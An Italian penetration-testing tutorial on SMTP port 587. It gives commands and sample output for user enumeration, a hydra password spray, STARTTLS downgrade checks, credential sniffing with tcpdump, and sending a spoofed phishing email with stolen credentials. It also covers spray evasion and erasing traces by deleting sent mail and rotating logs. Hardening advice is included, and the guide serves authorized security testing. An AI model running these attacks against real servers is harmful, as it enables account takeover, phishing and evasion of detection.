---
title: 'Porta 587 SMTP Submission: user enumeration, STARTTLS e credenziali email.'
slug: porta-587-smtp-submission
description: 'Scopri cos’è la porta 587 SMTP Submission, come funziona l’invio autenticato delle email secondo RFC 6409 e perché STARTTLS e SMTP AUTH sono centrali per valutare la sicurezza del servizio mail.'
image: /porta-587-smtp-submission.webp
draft: true
date: 2026-04-06T00:00:00.000Z
categories:
  - networking
subcategories:
  - porte
tags:
  - starttls
  - smtp-auth
---

> **Executive Summary** — La porta 587 è il canale SMTP Submission dove i mail client si autenticano per inviare email. A differenza della porta 25 (relay server-to-server), la 587 richiede autenticazione — ma l'enumerazione utenti funziona comunque via RCPT TO, il STARTTLS è vulnerabile a downgrade attack e le credenziali deboli sono diffuse. Questa guida copre user enumeration, credential spray, STARTTLS testing e verifica SPF/DKIM/DMARC.

TL;DR

* La porta 587 SMTP Submission richiede autenticazione, ma l'enumerazione utenti via RCPT TO funziona spesso anche senza login
* STARTTLS è vulnerabile a stripping/downgrade: un MitM può forzare la connessione in chiaro e catturare credenziali
* Credenziali email compromesse abilitano phishing interno, accesso a mailbox e spesso password reuse su altri servizi

Porta 587 SMTP Submission è il canale designato da RFC 6409 per la sottomissione delle email da parte dei client autenticati. La porta 587 vulnerabilità principali sono l'enumerazione utenti (VRFY/RCPT TO), le credenziali deboli su SMTP AUTH e le debolezze di STARTTLS. L'enumerazione porta 587 rivela utenti validi, versione del server mail, metodi di autenticazione supportati e configurazione TLS. Nel pentest, compromettere SMTP 587 significa accesso alle mailbox, capacità di inviare email dall'interno dell'organizzazione e spesso password reuse su Active Directory o altri servizi. Nella kill chain si posiziona tra recon (user enum) e initial access (credential spray → mailbox access → phishing interno).

## 1. Anatomia Tecnica della Porta 587

La porta 587 è registrata IANA come `submission`. SMTP Submission (RFC 6409) è il canale dove i client email (Outlook, Thunderbird, mobile) si autenticano per inviare messaggi. La differenza con le altre porte SMTP è fondamentale per il pentester:

| Porta   | Ruolo                        | Auth           | TLS                | Stato attuale               |
| ------- | ---------------------------- | -------------- | ------------------ | --------------------------- |
| **25**  | Relay server-to-server       | No (di norma)  | STARTTLS opzionale | Spesso bloccata da ISP      |
| **465** | SMTPS (implicit TLS)         | Sì             | TLS prima di tutto | Reintrodotta da RFC 8314    |
| **587** | Submission (client → server) | Sì (SMTP AUTH) | STARTTLS upgrade   | Standard attuale per client |

Il flusso operativo sulla 587:

1. Client si connette in chiaro sulla porta 587
2. Server invia il banner SMTP (software, versione)
3. Client invia `EHLO` — il server risponde con le capability (tra cui `250-STARTTLS` e `250-AUTH`)
4. Client esegue `STARTTLS` — upgrade a TLS
5. Client si autentica con `AUTH LOGIN` o `AUTH PLAIN`
6. Client invia l'email con `MAIL FROM`, `RCPT TO`, `DATA`

```
Misconfig: STARTTLS non obbligatorio (il server accetta connessioni plain)
Impatto: credenziali trasmesse in chiaro se il client non forza TLS
Come si verifica: telnet [server] 587 → EHLO test → se AUTH appare prima di STARTTLS, è plain-text
```

```
Misconfig: VRFY/EXPN abilitati senza autenticazione
Impatto: enumerazione utenti diretta — nomi, alias, mailing list
Come si verifica: telnet [server] 587 → VRFY admin → se risponde 250/252, è abilitato
```

```
Misconfig: Nessun rate limiting su AUTH
Impatto: brute force illimitato sulle credenziali email
Come si verifica: 10 tentativi AUTH rapidi senza blocco = no rate limit
```

## 2. Enumerazione Base

### Comando 1: Nmap

```bash
nmap -sV -sC -p 587 10.10.10.25
```

**Output atteso:**

```
PORT    STATE SERVICE VERSION
587/tcp open  smtp    Postfix smtpd
| smtp-commands: mail.target.com, PIPELINING, SIZE 10240000, VRFY, ETRN,
|   STARTTLS, AUTH PLAIN LOGIN, AUTH=PLAIN LOGIN, ENHANCEDSTATUSCODES,
|   8BITMIME, DSN,
|_  HELP
```

**Parametri:**

* `-sV`: fingerprint del mail server (Postfix, Exim, Exchange, Sendmail)
* `-sC`: script default — enumera comandi SMTP supportati
* `-p 587`: porta SMTP Submission

**Cosa ci dice questo output:** il server è Postfix. Supporta `VRFY` (enumerazione utenti diretta). `AUTH PLAIN LOGIN` indica i metodi di autenticazione. `STARTTLS` è disponibile ma non obbligatorio (il banner appare prima del TLS).

### Comando 2: Banner grab manuale

```bash
nc -vn 10.10.10.25 587
```

**Output atteso:**

```
Connection to 10.10.10.25 587 port [tcp/*] succeeded!
220 mail.target.com ESMTP Postfix (Ubuntu)
```

**Cosa ci dice questo output:** banner rivela hostname interno (`mail.target.com`), software (Postfix) e OS (Ubuntu). Queste informazioni alimentano la fase di recon.

## 3. Enumerazione Avanzata

### User enumeration con VRFY

```bash
smtp-user-enum -M VRFY -U /usr/share/wordlists/users.txt -t 10.10.10.25 -p 587
```

**Output:**

```
 10.10.10.25: admin exists
 10.10.10.25: info exists
 10.10.10.25: hr exists
 10.10.10.25: administrator does not exist
```

**Lettura dell'output:** tre utenti validi confermati: `admin`, `info`, `hr`. Questi diventano target per il credential spray. Per correlare gli utenti con quelli di Active Directory, consulta la [guida all'enumerazione LDAP](https://hackita.it/articoli/ldap).

### User enumeration con RCPT TO (più affidabile)

```bash
smtp-user-enum -M RCPT -D target.com -U /usr/share/wordlists/users.txt -t 10.10.10.25 -p 587
```

**Output:**

```
 10.10.10.25: admin@target.com exists
 10.10.10.25: it@target.com exists
 10.10.10.25: ceo@target.com exists
 10.10.10.25: fake123@target.com does not exist
```

**Lettura dell'output:** RCPT TO è più affidabile di VRFY perché non può essere disabilitato senza rompere la consegna email. Il server risponde `250` per utenti validi e `550` per inesistenti. L'utente `ceo@target.com` è un target di alto valore per il phishing.

### Nmap script per enumerazione

```bash
nmap -p 587 --script smtp-enum-users --script-args smtp-enum-users.methods={VRFY,EXPN,RCPT} 10.10.10.25
```

**Output:**

```
| smtp-enum-users:
|   VRFY:
|     admin
|     postmaster
|   RCPT:
|     admin@target.com
|     hr@target.com
|_    finance@target.com
```

### Verifica STARTTLS e TLS

```bash
openssl s_client -starttls smtp -connect 10.10.10.25:587 -servername mail.target.com
```

**Output:**

```
...
SSL-Session:
    Protocol  : TLSv1.2
    Cipher    : ECDHE-RSA-AES256-GCM-SHA384
...
Verify return code: 0 (ok)
```

**Lettura dell'output:** TLS 1.2 con cipher forte — la connessione è sicura dopo STARTTLS. Ma il problema è che STARTTLS è un upgrade opzionale: un attacker MitM può strippare il comando STARTTLS dalla risposta del server e forzare la connessione in chiaro. Verifica con `testssl.sh --starttls smtp 10.10.10.25:587` per un'analisi completa.

## 4. Tecniche Offensive

**Credential spray su SMTP AUTH**

Contesto: utenti enumerati con RCPT TO. Testa password comuni.

```bash
hydra -L users.txt -p "Spring2026!" smtp://10.10.10.25:587 -t 2 -W 10
```

**Output (successo):**

```
[587][smtp] host: 10.10.10.25   login: hr@target.com   password: Spring2026!
```

**Output (fallimento):**

```
[STATUS] attack finished, 0 valid passwords found
```

**Cosa fai dopo:** con credenziali valide, accedi alla mailbox (IMAP/OWA) e puoi inviare email come quell'utente. Prova le stesse credenziali su altri servizi: OWA, VPN, AD. Per massimizzare il [password reuse](https://hackita.it/articoli/bruteforce), testa su tutti i servizi esposti.

**STARTTLS stripping test**

Contesto: verifica se il server è vulnerabile a downgrade di STARTTLS.

```bash
# Connessione senza TLS — il server accetta AUTH in chiaro?
telnet 10.10.10.25 587
EHLO test
# Se la risposta include AUTH senza aver fatto STARTTLS prima → credenziali in chiaro
AUTH LOGIN
# base64 di admin
YWRtaW4=
# base64 di password
cGFzc3dvcmQ=
```

**Output (vulnerabile — auth accettata senza TLS):**

```
334 VXNlcm5hbWU6
334 UGFzc3dvcmQ6
235 2.7.0 Authentication successful
```

**Output (sicuro — auth rifiutata senza TLS):**

```
530 5.7.0 Must issue a STARTTLS command first
```

**Cosa fai dopo:** se il server accetta AUTH senza TLS, un attacker sulla rete può catturare credenziali in chiaro con tcpdump: `tcpdump -A -i eth0 port 587 | grep -i "auth\|user\|pass"`. Documenta nel report come finding critico.

**Test open relay**

Contesto: verifica se il server inoltra email per domini esterni (non dovrebbe sulla 587 senza auth).

```bash
telnet 10.10.10.25 587
EHLO test
MAIL FROM:<test@evil.com>
RCPT TO:<admin@target.com>
DATA
Subject: Relay Test
Test open relay
.
```

**Output (open relay — critico):**

```
250 2.0.0 Ok: queued
```

**Output (relay bloccato — corretto):**

```
554 5.7.1 Relay access denied
```

**Cosa fai dopo:** se è open relay, puoi inviare email spoofate dall'interno. Anche senza open relay, se hai credenziali valide puoi inviare email come quell'utente, bypassando SPF perché invii dal server legittimo.

**Verifica SPF/DKIM/DMARC**

Contesto: valuta la postura anti-spoofing del dominio target.

```bash
dig +short TXT target.com | grep spf
dig +short TXT _dmarc.target.com
dig +short TXT default._domainkey.target.com
```

**Output:**

```
"v=spf1 include:_spf.google.com ~all"
"v=DMARC1; p=none; rua=mailto:dmarc@target.com"
(nessun record DKIM)
```

**Lettura dell'output:** SPF con `~all` (softfail, non rejectano). DMARC con `p=none` (solo monitoring, non blocca). Nessun DKIM. Questo dominio è vulnerabile a email spoofing perché nessuna policy è in enforcement. Per testare, usa `swaks` come spiegato nella guida alle [tecniche di social engineering](https://hackita.it/articoli/phishing).

**Invio email spoofata (con credenziali)**

Contesto: hai credenziali SMTP valide e vuoi dimostrare il phishing interno.

```bash
swaks --to ceo@target.com --from it-support@target.com \
  --server 10.10.10.25:587 --tls \
  --auth-user hr@target.com --auth-password Spring2026! \
  --header "Subject: Aggiornamento password obbligatorio" \
  --body "Clicca qui per aggiornare: https://legit-looking-link.com"
```

**Output (successo):**

```
=== Trying 10.10.10.25:587...
<~  220 mail.target.com ESMTP Postfix
 ~> EHLO test
<~  250-STARTTLS
 ~> STARTTLS
=== TLS started
 ~> AUTH LOGIN
<~  235 Authentication successful
 ~> MAIL FROM:<it-support@target.com>
<~  250 2.1.0 Ok
 ~> RCPT TO:<ceo@target.com>
<~  250 2.1.5 Ok
<~  250 2.0.0 Ok: queued
```

## 5. Scenari Pratici di Pentest

### Scenario 1: Enterprise Exchange/O365

**Situazione:** azienda con Exchange 2019 su porta 587. Assessment interno.

**Step 1:**

```bash
nmap -sV -sC -p 587 10.10.10.25
```

**Step 2:**

```bash
smtp-user-enum -M RCPT -D target.com -U /usr/share/seclists/Usernames/Names/names.txt -t 10.10.10.25 -p 587
```

**Step 3:**

```bash
hydra -L valid_users.txt -p "Target2026!" smtp://10.10.10.25:587 -t 1 -W 15
```

**Se fallisce:**

* Causa probabile: lockout policy attiva (Exchange blocca dopo 5 tentativi)
* Fix: password spray con 1 password alla volta e pausa di 30+ minuti tra tentativi. Usa `spray.sh` o `ruler` per O365

**Tempo stimato:** 30-60 minuti (enumerazione + spray lento)

### Scenario 2: Postfix su Linux server

**Situazione:** server email Linux con Postfix. La porta 587 accetta auth.

**Step 1:**

```bash
nmap -p 587 --script smtp-commands,smtp-enum-users 10.10.10.25
```

**Step 2:**

```bash
# Verifica se AUTH funziona senza TLS
telnet 10.10.10.25 587
EHLO test
AUTH LOGIN
```

**Se fallisce:**

* Causa probabile: `smtpd_tls_security_level = encrypt` in Postfix (forza TLS)
* Fix: usa openssl: `openssl s_client -starttls smtp -connect 10.10.10.25:587` poi AUTH

**Tempo stimato:** 15-30 minuti

### Scenario 3: External pentest — email security assessment

**Situazione:** assessment della postura email del cliente dall'esterno.

**Step 1:**

```bash
dig +short MX target.com
dig +short TXT target.com | grep spf
dig +short TXT _dmarc.target.com
```

**Step 2:**

```bash
swaks --to test@target.com --from ceo@target.com --server [MX_server]:587
```

**Se fallisce:**

* Causa probabile: il server MX rifiuta connessioni sulla 587 dall'esterno (solo porta 25 per relay)
* Fix: testa sulla porta 25 per relay spoofing. La 587 è per client autenticati

**Tempo stimato:** 10-20 minuti

## 6. Attack Chain Completa

| Fase       | Tool           | Comando chiave                                   | Output/Risultato     |
| ---------- | -------------- | ------------------------------------------------ | -------------------- |
| Recon      | nmap           | `nmap -sV -sC -p 587 [target]`                   | Software, capability |
| User Enum  | smtp-user-enum | `smtp-user-enum -M RCPT -D target.com`           | Lista utenti validi  |
| Cred Spray | hydra          | `hydra -L users.txt -p pass smtp://[target]:587` | Credenziali valide   |
| TLS Test   | openssl        | `openssl s_client -starttls smtp`                | Stato TLS/cipher     |
| SPF/DMARC  | dig            | `dig TXT _dmarc.target.com`                      | Policy anti-spoofing |
| Phishing   | swaks          | `swaks --to target --from spoofed --auth`        | Email inviata        |

**Timeline stimata:** 30-90 minuti per l'intera catena.

**Ruolo della porta 587:** è la porta dell'identità email. Credenziali SMTP compromesse significano phishing perfetto dall'interno, con email che passano ogni filtro.

## 7. Detection & Evasion

### Cosa monitora il Blue Team

* **Log SMTP**: tentativi AUTH falliti multipli, AUTH da IP inusuali
* **SIEM**: alert su login SMTP da geo-localizzazioni anomale
* **Exchange**: audit log con `Send As` e `Send On Behalf Of`

### Tecniche di Evasion

```
Tecnica: Password spray ultra-lento
Come: 1 password ogni 60 minuti per tutti gli utenti — sotto il threshold di lockout
Riduzione rumore: indistinguibile da utenti che sbagliano password
```

```
Tecnica: Enumerazione via timing
Come: misura il tempo di risposta di RCPT TO — utenti validi rispondono più lentamente
Riduzione rumore: nessun tentativo di auth, solo RCPT TO
```

### Cleanup

* Le email inviate via SMTP lasciano header con il tuo IP: `Received: from [tuo_IP]`
* Se hai accesso alla mailbox: elimina le email inviate dalla cartella Sent
* I log SMTP sul server registrano ogni connessione — con accesso root, ruota i log

## 8. Toolchain e Confronto

| Aspetto        | SMTP 587            | SMTP 25            | SMTPS 465       | IMAP 993      |
| -------------- | ------------------- | ------------------ | --------------- | ------------- |
| Porta          | 587/TCP             | 25/TCP             | 465/TCP         | 993/TCP       |
| Ruolo          | Client → Server     | Server → Server    | Client → Server | Lettura email |
| Auth           | Obbligatoria        | Opzionale          | Obbligatoria    | Obbligatoria  |
| TLS            | STARTTLS upgrade    | STARTTLS opzionale | Implicit TLS    | Implicit TLS  |
| Downgrade risk | Sì (STARTTLS strip) | Sì                 | No              | No            |

## 9. Troubleshooting

| Errore / Sintomo              | Causa                                       | Fix                                                |
| ----------------------------- | ------------------------------------------- | -------------------------------------------------- |
| `530 Must issue STARTTLS`     | Server richiede TLS prima di AUTH           | Usa `openssl s_client -starttls smtp`              |
| `535 Authentication failed`   | Credenziali errate o account bloccato       | Verifica con credenziali note, aspetta per lockout |
| `550 User unknown` in RCPT TO | Utente inesistente — enum funzionante       | Conferma come utente non valido, procedi           |
| `252` in VRFY                 | Server non conferma né nega — enum parziale | Passa a RCPT TO per conferma                       |
| Connessione rifiutata su 587  | Porta non esposta o solo interna            | Verifica porta 25 per relay e 465 per SMTPS        |

## 10. FAQ

**D: Qual è la differenza tra porta 25, 465 e 587 per SMTP?**

R: La 25 è per relay server-to-server (spesso bloccata da ISP). La 587 è per submission client con STARTTLS. La 465 è SMTPS con TLS implicito (più sicura di 587 perché non c'è rischio STARTTLS downgrade).

**D: Come enumerare utenti email sulla porta 587?**

R: Usa `smtp-user-enum -M RCPT -D dominio.com -U users.txt -t [server] -p 587`. RCPT TO è il metodo più affidabile perché non può essere disabilitato.

**D: STARTTLS è sicuro?**

R: È vulnerabile a downgrade attack: un MitM può strippare STARTTLS dalla risposta EHLO e forzare la connessione in chiaro. La porta 465 con TLS implicito è più sicura perché il TLS si stabilisce prima di qualsiasi comando SMTP.

**D: Come proteggere la porta 587?**

R: Forza TLS obbligatorio (`smtpd_tls_security_level = encrypt` su Postfix). Abilita rate limiting e lockout su AUTH. Disabilita VRFY/EXPN. Configura SPF, DKIM e DMARC con policy `reject`.

## 11. Cheat Sheet Finale

| Azione           | Comando                                                               | Note                      |
| ---------------- | --------------------------------------------------------------------- | ------------------------- |
| Scan SMTP        | `nmap -sV -sC -p 587 [target]`                                        | Banner + capability       |
| User enum VRFY   | `smtp-user-enum -M VRFY -U users.txt -t [target] -p 587`              | Disabilitabile            |
| User enum RCPT   | `smtp-user-enum -M RCPT -D [domain] -U users.txt -t [target]`         | Più affidabile            |
| Credential spray | `hydra -L users.txt -p "Pass2026!" smtp://[target]:587`               | Lento per evitare lockout |
| TLS test         | `openssl s_client -starttls smtp -connect [target]:587`               | Verifica cipher           |
| TLS full audit   | `testssl.sh --starttls smtp [target]:587`                             | Analisi completa          |
| SPF check        | `dig +short TXT [domain]`                                             | Cerca v=spf1              |
| DMARC check      | `dig +short TXT _dmarc.[domain]`                                      | p=none è debole           |
| Email spoofata   | `swaks --to victim --from spoofed --server [target]:587 --tls --auth` | Con credenziali           |
| Open relay test  | `telnet [target] 587 → MAIL FROM/RCPT TO senza auth`                  | Se 250 = open relay       |

### Perché Porta 587 è rilevante nel 2026

L'email resta il vettore di attacco principale per phishing e social engineering. La porta 587 è presente su ogni infrastruttura email. User enumeration via RCPT TO funziona quasi sempre, STARTTLS resta vulnerabile a downgrade, e le credenziali email deboli sono epidemiche — soprattutto su account di servizio e mailbox condivise. SMTP Smuggling (CVE-2023-51764/51765/51766) ha ampliato ulteriormente la superficie di attacco.

### Hardening e Mitigazione

* Forza TLS obbligatorio sulla 587: `smtpd_tls_security_level = encrypt`
* Disabilita `VRFY` e `EXPN`: `disable_vrfy_command = yes` su Postfix
* Rate limit e lockout su AUTH: max 5 tentativi poi blocco 30 minuti
* SPF con `-all` (hard fail), DKIM su tutti i domini, DMARC con `p=reject`
* Monitora accessi SMTP da IP/geo anomali

### OPSEC per il Red Team

L'enumerazione RCPT TO genera log visibili. Per ridurre rumore: enumera da IP diversi (se possibile), limita le query a 50-100 al minuto, e usa un EHLO domain plausibile. Il credential spray su SMTP è meno monitorato di quello su OWA/ADFS — ma il lockout è condiviso se collegato ad AD. Ogni email inviata via SMTP lascia header con IP sorgente: usa un relay intermedio se necessario.

***

Tutti i comandi e le tecniche sono destinati esclusivamente ad ambienti autorizzati: penetration test con contratto, lab, CTF. Riferimento: RFC 6409, RFC 8314, CVE-2023-51764. Approfondimento: [https://www.speedguide.net/port.php?port=587](https://www.speedguide.net/port.php?port=587)

> Vuoi supportare HackIta? Visita [hackita.it/supporto](https://hackita.it/supporto) per donazioni. Per penetration test professionali e formazione 1:1, scopri [hackita.it/servizi](https://hackita.it/servizi).
